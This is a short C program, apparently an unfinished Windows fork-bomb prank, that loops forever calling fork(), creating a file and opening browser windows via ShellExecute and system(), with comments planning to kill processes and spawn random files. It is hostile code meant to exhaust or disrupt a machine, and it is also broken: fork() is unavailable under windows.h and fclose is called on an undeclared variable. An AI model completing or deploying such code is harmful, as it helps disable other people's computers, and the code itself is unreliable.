#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

int main()
{
	while(1){
		fork();
		fork();
		fork();

		FILE *file;
		file=fopen("file.txt","w");
		fclose(fp);

		ShellExecute(NULL, "open", "http://url", NULL, NULL, 	SW_SHOWNORMAL);
		system("cmd /c start http://google.com/"); 
	}
	return 0;
}

//open task manager
//close processes ending in .xxx
//open terminal to create random files ending in random string
//open terminal to create open browsers
//fork